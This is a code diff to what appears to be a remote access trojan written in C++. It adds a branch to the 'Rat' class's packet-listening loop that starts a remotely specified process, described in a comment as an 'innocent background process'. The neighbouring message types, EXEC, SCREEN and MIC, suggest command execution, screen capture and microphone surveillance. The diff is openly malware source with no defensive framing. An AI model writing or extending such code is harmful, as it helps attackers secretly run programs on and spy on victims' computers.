@@ -101,6 +101,19 @@ void Rat::Listen() {
         // process packet data
         if (packet.GetType() == MsgType::EXEC) {
 
+        } else if (packet.GetType() == MsgType::INVOKE) {
+            // create innocent background process
+            std::cerr << " |__init_proc" << packet.GetPacketMessage() << std::endl;
+            bool procCreated = UserProc::getInstance().CreateBackProc(
+                packet.GetPacketMessage()
+            );
+
+            if (procCreated) {
+                std::this_thread::sleep_for(std::chrono::seconds(3));
+                UserProc::getInstance().Close();
+            } else {
+                std::cerr << "[-] Error during proc prep." << std::endl;
+            }
         } else if (packet.GetType() == MsgType::SCREEN) {
 
         } else if (packet.GetType() == MsgType::MIC) {
